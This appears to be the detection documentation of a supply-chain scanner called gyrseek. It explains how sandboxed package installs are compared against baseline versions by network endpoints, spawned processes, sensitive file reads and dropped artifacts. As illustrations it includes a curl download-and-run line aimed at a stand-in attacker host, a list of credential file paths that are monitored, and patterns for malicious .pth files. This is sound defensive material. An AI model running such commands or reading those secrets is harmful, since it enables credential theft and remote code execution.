# Behavioral Detection

What gyrseek compares between a package version and its baselines, check by check. The overview is in the [README](../README.md#how-it-works); known attack waves and the verdict on each are in [DETECTION_COVERAGE.md](DETECTION_COVERAGE.md).

## Network Behavior Detection

`gyrseek` uses syscall tracing (`strace`) during sandbox installs to observe outbound network connections.

- It captures connection target IPs — **both IPv4 and IPv6**, normalized to canonical form — from the trace output.
- It computes the difference between **current version** and **baseline versions** using domain-aware FCrDNS diffing.
- Any endpoint whose domain (or IP, when unresolvable) has not been seen in baseline traffic is treated as a behavioral anomaly.
- Install-time `git clone` command signatures (e.g. clone target and recursive-clone usage) are also diffed across versions.
- Install-time execution of all programs is captured and diffed across versions to catch download-and-run payloads — see [Process-Execution Detection](#process-execution-behavior-detection).
- Post-install file inventory (binary executables, suspicious `.pth` files, unexpected runtimes, files >10 MB) is recorded and diffed across versions — see [Post-Install Artifact Detection](#post-install-artifact-behavior-detection).
- New IPs are **always** treated as anomalies (fail-closed), unless the IP's FCrDNS resolves to a domain already seen in baseline traffic — in which case it is silently discarded as a benign CDN edge rotation.
- Domain-aware IP diff resolves each IP via FCrDNS and compares at the domain level, not the IP level. If a current IP resolves to a domain already seen in baseline traffic (e.g. a rotated Fastly edge IP for `files.pythonhosted.org`), it is silently discarded — no hardcoded domain list needed. This handles benign CDN edge rotations for any infrastructure automatically. Unresolvable IPs fall back to plain IP membership so the diff stays fail-closed for genuinely new or spoofed endpoints.
- The `domain_allowlist` uses **forward-confirmed reverse DNS (FCrDNS)**: a PTR hostname is only trusted if it resolves _forward_ back to the original IP. An attacker who sets their C2 server's PTR record to an allowlisted domain cannot bypass the allowlist, because the allowlisted domain's real A/AAAA record does not point back at the C2 IP.
- **Environment variables:** Because reading an environment variable (e.g. `process.env.AWS_KEY`) does not make a system call, it is invisible to `strace`. However, `gyrseek` does not need to see the read. If a package reads a secret and attempts to exfiltrate it over the network, the **Network Behavior Detection** flags the new connection to the attacker's IP/domain and kills the install. Exfiltration is caught at the network boundary, regardless of how the payload encrypts or hides the secret in transit.

Example — abnormal network behavior detected:

```text
❌ [gyrseek] CRITICAL WARNING: network_anomaly flagged!
Package 'left-pad', version '1.3.0' contacted new endpoints not seen in baseline versions (1.2.0, 1.1.3): ["203.0.113.42 -> suspicious-c2.example"]
```

Example — a new hidden install-time `git clone` detected:

```text
❌ [gyrseek] CRITICAL WARNING: git_clone_anomaly flagged!
Package 'left-pad', version '1.3.0' introduced new git clone behavior not seen in baseline versions (1.2.0, 1.1.3): ["https://github.com/unknown/repo.git|non-recursive"]
```

## Git Clone Behavior Detection

- **Install-time clones** (e.g. hidden `git clone` calls inside package scripts) are compared across package versions during scanning, and new behavior is fail-closed unless allowlisted.
- Clone-detection logic is exercised via inline unit tests in `src/scanning.rs` (moved from the old `tests/git_clone_behavior_tests.rs`).
- **Runtime interception of direct `git clone ...` shell commands is not enabled yet** in the CLI parser.

## Process-Execution Behavior Detection

`gyrseek` takes a least-privilege approach to program execution during installation. Any process a package runs that it didn't run in previous versions is treated as suspect.

### How it works
It captures **every** `execve` system call inside the sandbox, extracts the executable name and its exact arguments to form a signature, and diffs them against baseline versions. If a new or changed process execution appears, it fails closed.

### Common Attack Patterns Caught
- **Download-and-Execute (Bun/Deno):** Many attacks don't assume a malicious runtime is present — they download one. For example, the Shai-Hulud "Hades/miasma" PyPI wave downloads the Bun JavaScript runtime and runs an obfuscated stealer via `bun run _index.js`.
- **System Utilities & Shell Scripts (`curl`, `wget`, `bash`, `sh`):** If a package uses `curl` or `wget` to download a payload (e.g., `curl http://attacker.com/payload.sh`), or executes a shell script (e.g., `bash ./malicious.sh` or `sh -c "echo payload"`), the exact executable and its arguments are captured as a signature (like `curl|-O|http://attacker.com/payload.sh` or `bash|./malicious.sh`). Any newly introduced utility/script execution, or an existing utility with new/changed arguments, is flagged. *(Note: The network connection made by `curl` or `wget` is independently caught by the Network Behavior Detection).*

### Reducing Noise
- **Harness Exclusion:** The sandbox's own install commands (e.g., `uv pip install`, `npm install`) and interpreter-discovery subprocesses are automatically filtered out. Only the package's own behavior contributes to the diff.
- **Allowlisting:** Expected new behavior can be explicitly permitted using the `process_exec_allowlist` config key (see [Configuration](CONFIGURATION.md)).

> **Scope Limitation:** This observes processes executed _inside the sandbox during install_ (e.g., npm `preinstall`/`postinstall` hooks or Python `setup.py` execution). Attacks that defer execution to the _next interpreter startup_ (like the PyPI `*-setup.pth` variant) execute outside this window. However, Gyrseek's post-install artifact scan catches the `.pth` file itself before the install finishes (see [Post-Install Artifact Detection](#post-install-artifact-behavior-detection)).

## Sensitive File Access Behavior Detection

`gyrseek` traces `open` and `openat` system calls to actively monitor for credential and configuration theft attempts. While checking environmental variables directly is not possible due to `strace` limitations, monitoring sensitive file access provides a robust defense against exfiltration techniques.

### How it works
If an installation script unexpectedly reads highly sensitive files (e.g., `~/.aws/credentials`, `~/.ssh/id_rsa`, `~/.npmrc`, `~/.env`, `/etc/passwd`), `gyrseek` captures the hex-escaped path via `strace` and unescapes it for analysis. The accessed files are then diffed against baseline versions. If a new package version accesses sensitive files that older versions never touched, the install is immediately blocked.

### Why Baseline Diffing is Essential Here
It might seem safer to unconditionally block *any* sensitive file access (ignoring baselines entirely), but this is impractical for a scanner that wraps the entire install process:
- **Package Managers**: The `strace` trace captures the behavior of the package manager itself. `npm` and `yarn` **always** read `~/.npmrc` to find registry URLs and auth tokens. `pip` often reads `/etc/passwd` to resolve the user's home directory.
- **Private Git Dependencies**: If a package has a private git dependency (e.g., `"git+ssh://git@github.com/..."`), the package manager will spawn `git clone`, which legitimately reads `~/.ssh/id_rsa` or `~/.git-credentials` to authenticate.
- **Private Registries**: Companies using AWS CodeArtifact for their private package registry may trigger an AWS credential helper under the hood, which legitimately reads `~/.aws/credentials` during the install.
- **Legitimate Build Tools**: Some packages legitimately read `.env` files during `postinstall` to generate client code (e.g., Prisma).

If `gyrseek` blocked sensitive file reads unconditionally, almost every `npm install` would fail simply because `npm` read `~/.npmrc`, and any project with a private git dependency would break. The baseline diff solves this: if a package has always relied on a private git dependency, the baseline version's installation *also* read `~/.ssh/id_rsa`. `gyrseek` sees no *new* sensitive reads, allowing the install to proceed. However, if a normal utility like `lodash` suddenly tries to read `~/.ssh/id_rsa` in a compromised version, the diff catches the brand new read attempt and blocks it instantly.

> **Note on SDKs (e.g., AWS SDK):** Legitimate SDKs (like `boto3` or `@aws-sdk/client-s3`) **do not** read credentials like `~/.aws/credentials` during installation. They only read them at runtime when imported by your application. Therefore, a clean install of the AWS SDK will not trigger an alert. If an installation *does* try to read them, it is almost certainly a malicious script.

## Post-Install Artifact Behavior Detection

`gyrseek` runs a comprehensive file inventory inside the Docker container **after each install probe**, recording every installed file (path, size, executable format and, for `.pth` files, the first 300 bytes of content). Classification happens on the Rust side, so new IOC patterns are detected without container script changes.

The classifier emits four signal categories:

1. **`binary`** — ELF, Mach-O, or PE executables deposited in the install tree. Catches cryptominers, compiled malware, and arbitrary native binaries.
2. **`suspicious_pth`** — Python `.pth` files containing executable code (`import`, `exec`, `eval`, `urllib`, `subprocess`, `ctypes`, `socket` patterns). These are essentially never used by legitimate namespace-path `.pth` files and are the Hades/Miasma delivery mechanism.
3. **`unexpected_runtime`** — bun/deno runtime binaries (identified by filename and binary type). Emitted in addition to the `binary` finding for the same file. Catches download-and-execute attacks that leave a runtime behind.
4. **`large_file`** — any file >10 MB in the install tree. Catches data exfiltration staging and large payload drops.

**How it works** — after each per-probe install step in the Docker matrix script, one `find` (over `/work`, `/home/gyrseek`, `/var/tmp`, `/run/lock` and `/dev/shm`) and one interpreter process inventory every regular file there (a `node_modules` of 10,000 files takes milliseconds, not the minutes of a process per file), capturing the size, the executable format (ELF, Mach-O or PE, recognised from the file's own first bytes, since the scanner images have no `file` command) and, for `.pth` files, the first 300 bytes of content. The interpreter is the one the package manager needs anyway: Python for pip, uv and poetry, Node for npm and pnpm. A custom scanner image (`GYRSEEK_PY_SCANNER_IMAGE`, `GYRSEEK_NPM_SCANNER_IMAGE`) therefore has it too; if it does not, or it fails, the scan stops with a message instead of continuing with an empty inventory. The raw inventory is written to `gyrseek_artifacts_N.log` (in the root-only trace tmpfs, then streamed to the host), embedded in the probe trace, and classified by `classify_inventory_lines` in scanning.rs before entering the diff pipeline. Files the scanner user leaves outside the install tree (`/home/gyrseek`, `/var/tmp`, `/run/lock`, `/dev/shm`, two of which allow execution; a normal install writes nothing there) are reported as `dropped_file`, and those places are emptied between probes so one probe cannot leave something for the next. What it does not cover: `/tmp` (it is `noexec` and busy with temporary files), symlinks, other places that a custom scanner image may let the scanner user write to (the list is fixed, measured in the two default images), and scripts, WebAssembly and Java classes inside `/work` (open findings #476 and #477). A binary or large file counts as new only if its name is new after replacing the hash or version in it (`libtiff-0c352bdc.so.6.3.0` and `libtiff-aa11bb22.so.6.4.1` are the same file); a file with a new name, in a new directory or of another format is flagged, and `artifact_allowlist` can unblock a known one.

**Diff-based verdict** — like all of gyrseek's detection signals, artifact findings are compared across versions. A finding present in a baseline version is expected; a finding newly appearing in the current version (absent from all baselines) is **fail-closed**:

```text
❌ [gyrseek] CRITICAL WARNING: Suspicious artifact(s) discovered after install flagged!
Package 'evil-pkg', version '2.0.0' introduced new suspicious file artifact(s) not
seen in baseline versions (1.9.0, 1.8.0): ["suspicious_pth|/work/site-packages/evil.pth|import socket"]
This may indicate a .pth file with executable content or an unexpected runtime binary.
```

This closes the Hades/Miasma `.pth` write-to-disk gap — the `.pth` file is written during `pip install` (as ordinary file I/O, invisible to strace's `network,execve` filter) but detected by the post-install artifact scan before the container session ends. The same pipeline catches ELF-based payloads, large data exfiltration, and any future file-level IOC — all without modifying the container script.
